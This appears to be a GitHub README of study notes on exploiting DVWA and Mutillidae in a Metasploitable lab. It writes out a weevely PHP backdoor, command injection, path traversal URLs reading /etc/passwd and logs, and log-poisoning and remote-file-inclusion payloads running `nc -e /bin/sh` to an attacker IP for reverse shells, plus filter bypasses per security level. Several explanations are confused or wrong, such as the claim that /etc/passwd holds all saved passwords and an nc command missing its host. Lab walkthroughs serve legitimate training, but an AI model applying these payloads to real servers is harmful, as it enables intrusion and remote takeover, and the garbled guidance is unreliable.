# basic vulnerabilities in Metasploitable
## File Upload Vulnerability
- weevely is a tool used for opening the backdoors and to access the website.
```
weevely generate 123456 /root/shell.php
```
- this creates a php file which is used to upload and open backdoors
- after uploading, run the following command
- `weevely (respective url) 123456`
- now from the terminal we can open the backdoor that is  `cd ..` to get back and then we can access as we want.
- burpsuite is used to interpt the website being executed with the help of proxy.

> __low__ - any file can be uploaded i.e., shell.php
>![Screenshot 2024-04-12 223232](https://github.com/stellados53/kali_commands/assets/142677726/dbc0885c-2112-4832-989f-a6c8dba0eb44)
> 
> __medium__ - we rename the file from shell.php to shell.jepg i.e., shell.jpeg and upload it using bruiteforce by changing the filename to php.
>![Screenshot 2024-04-12 224041](https://github.com/stellados53/kali_commands/assets/142677726/9d3a9640-817f-446f-91cc-f09b4c5d2baf)
> 
> __high__ - we change the file type to shell.php.jpeg and upload and then expoit.
> ![Screenshot 2024-04-12 224407](https://github.com/stellados53/kali_commands/assets/142677726/e202b0e8-1ee3-44e0-8f28-a04c6d404255)
- overall output will be..
 ![Screenshot 2024-04-12 224454](https://github.com/stellados53/kali_commands/assets/142677726/5c02d3fb-e53e-4ed3-85c7-477390b703c7)


<h3 align="center"> ... </h3> 

## Code Execution Vulnerability

- open any searchable website (dvwa- command execution)
- run the following command
```
nc -vv -l -p 8080
```
![Screenshot 2024-04-09 232801](https://github.com/stellados53/kali_commands/assets/142677726/7d1cc4d5-5310-4934-84ba-2c44d0124a0e)

> nc   = netcat tool this is used to use and connect the computer to the website.
> 
> -vv  = it is just a verbose mode, which retireve more output.
> 
> -l   = Listen mode, used to create a server that listens for incoming connections.
> 
> -p   = Specifies the source port number.
> 
> 8080 = port number.
- Now you can execute any command of kali linux such as pwd, ls -la.
- the execution will be done.

> __low__ - in searchbox END WITH ";" AND RUN THE COMMAND ACCORDING TO THE WEBSITE OS.MOST IMPORTANT IF THE IP IS 192.168.11.129, SUBTRACT THE LAST NUMBER -1 THAT IS 192.168.11.128.
>
> __medium__ - it cannot run two commands using ";" so we use "|" for the exploit.
>![Screenshot 2024-04-12 223232](https://github.com/stellados53/kali_commands/assets/142677726/d22e5048-15cd-491b-817f-f2a79979e8d3)
>
> __high__ is not even possible

<h3 align="center"> ... </h3> 

## File Inclusion Vulnerability
- it allows you to read  any file in the same server.
- access files outside www directory.
- it is used to get the reverse connection of the webserver.
- generally to get the commands to be executed in the kali linux we use  `cat etc/passwd`, the same we use in the file url to extract all the saved passwds.
```
http://192.168.11.129/dvwa/vulnerabilities/fi/?page=/../../../../../etc/passwd
```
- by using this command we can get the all saved passwords saved in the webserver.
- ![Screenshot 2024-04-12 222928](https://github.com/stellados53/kali_commands/assets/142677726/615af2ec-4ac3-4ca6-a33b-28a323ed794a)
- by modifing the useragent from mozilla to `<?phpinfo();?>` using bruiteforce proxy(header)..we get the php information about the website
- ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/faab1ae4-f1dc-4578-9098-b2995c78dc04)
- by modifing the useragent to `<?passthru("nc -e /bin/sh 192.168.11.128 8888");?>` in the bruiteforce header for the connect of the website..and the terminal of kali linux `nc -vv -l -p 8888` to make connection.
- ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/26b2674a-e047-4c5f-8f72-bc938ca5ed35)
### Methods Of Exploitation
- Now as reference from the above use the another executable urls.
 ```
http://192.168.11.129/dvwa/vulnerabilities/fi/?page=/../../../../..//proc/self/environ
```
```
http://192.168.11.129/dvwa/vulnerabilities/fi/?page=/../../../../../var/log/auth.log
```
```
http://192.168.11.129/dvwa/vulnerabilities/fi/?page=/../../../../../var/log/apache2/access.log
```
- In `proc/self/environ`..it retrieves the information about the client information.
> ![Screenshot 2024-04-12 231736](https://github.com/stellados53/kali_commands/assets/142677726/ab250e34-700e-49c3-bcb9-500b88edd38c)
>
- In `var/log/auth.log`..it retrieves all the login attempts to the webserver.
- In the split the terminal into 2 the one contains the the connection command that is `nc -vv -l -p 8888` and the other will be `ssh "<?passthru('nc -e /bin/sh 192.168.11.128 8888');?>@192.168.11.128`
- But the passthru command contain spaces that is between nc and -e etc..so we use decoder from the bruiteforce to encode the command as base64 to get a non-indent space line
> ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/a13b5290-c212-4249-9e31-a40e1a2b3914)
> 
- now..run the command as per the image.
> ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/b7b7144e-e541-40ee-85f1-86ca80ac5fae)
> 
- then we get the final reverse connection to the webserver..
> ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/5ce2bbdf-bd7f-407f-9bbb-7945b1662342)

<h3 align="center"> ... </h3> 

## Remote File Inclusion Vulnerability

- Similar to local file inclusion.
- But allows an attacker read ANY file from ANY server.
- Execute php files from other servers on the current server.
- Store php files on other servers as .txt

- Firstly we should go the the metaspoitable manchine and run.
```
sudo nano /etc/php5/cgi/php.ini
```
- This allows the url for the remote file inclusion.
- ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/2a55caff-d69e-43ee-8980-258d3d95ddef)
- Now run `ctrl+W` this allows you to search any line in the output.
- Now run `allow_url` this searches the allow_urlf as mentioned in the above image.
- Make sure that they both are ON, if not change it and run `ctrl+X` then `Y`.
- Then to save the location `ctrl+T` then select `php.ini`.
- Then click enter.
- Now we have to restart the webserver so that the changes work properly. Run the command.
```
sudo /etc/init.d/apache2 restart
```
- ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/a815f59d-b4a3-4b53-aa9b-41bc7fdaf015)
- FINISHED!!
- Now open the kali linux and create a file. that should contain the following content
```
<?php
passthru("nc -e /bin/sh 8080");
?>
```
![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/e3e8e25e-d396-4110-a989-0c7383164e5d)
- now save the file in the `/var/www/html/` location.
- open terminal and DVWA website set it as low and open file inclusion.
- make sure that the apache2 is already installed. To check the status run..`sudo service apache2 status`. make sure that the they __active(running)__ and __enabled__.
- ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/2b7f42f2-0d66-4535-a411-4ac3de4f7b4c)
- If not, To start the apache2 server run the command `sudo service apache2 start`.
- Now open the webbrowser and try to access the file in webbrowser.
- ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/f16a0ddb-eeac-4750-981f-0170a66348e0)

> __Security at LOW:__
> 
> now copy the url and paste it from the `?page=`..remove`include.php`. and add a `?`..this looks like..
> ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/8edf1c00-e4ca-4e74-afea-dfff1cdf1dc7)
> now open the terminal and run `nc -vv -l -p 8080` to recieve the reverse connection.
> as we click enter in the webbrowser. this makes the connection in the command terminal with the webbrowser.
> ![Screenshot 2024-04-20 162650](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/edebbc23-9355-4bfa-97a2-c8335a10cc3c)
>
> __Security at MEDIUM__:
>
> the process is as same as the LOW SECURITY..but as there is a `http://` in the middle of the URL...
> So rename intead of `tt` in the `http://` rename it as `TT` i.e., `https://`.
> ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/30ead58e-eb9b-482f-bf51-2bbb7e7c5968)
>
> __Security at HIGH__: the expoit is impossible because it retrieves only `include.php` page.cannot access another files it, so it is difficult to exploit them.
>
> 

<h3 align="center"> ... </h3> 

## SQL Injection Vulnerability

- to open run the mutillidae make sure that the setting is done in metaspoitable machine.
```
https://www.youtube.com/watch?v=tYmDiz0SPaw&feature=youtu.be
```
- now register your account in the mutillidae and the logout again. hence it creates a account for and use that account to expoit the sql injection.
- now logout and to break the page we should use `'and'`,`'order by'` or `'`
- now at the admin page type your username and at the password keep `'` and try to login it retrives as shown in the image
- ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/a2799618-c66e-481a-af55-a292f9228402)
- If we get this page it is very easy to do sql injection.
- And now again logout.

> __LOW SECURITY__ :
> and keep the following notepad passcodes.
> ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/a2ec20c7-88cd-485f-be71-99f1c763629c)
> this is basically called blackbox testing. there will be no code to be executed or URLs to be editing.
> 
>__MEDIUM SECURITY__:
> Now click on TONGLE SECUIRTY which increases the security code.
> Now, we can not expliot using low security..so to do exploiting we use burpsuite.
> Open burpsuite, when try to login using the LOW-SECURITY techinques it retrives a error without sending the packet to the burpsuite because it contains special characters.
> To by pass the code we should type the password with any special characters. Now clicking on login the packet is sent to the burpsuite.
> Now we should modify the password with our notepad passcodes in the `request body parameter` > `password` > [change the value, make sure the `or ` should be specified] > `apply changes` > `forward`.
>  ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/47cd4466-c4d8-42e3-8a94-c68a29e4a548)
> 


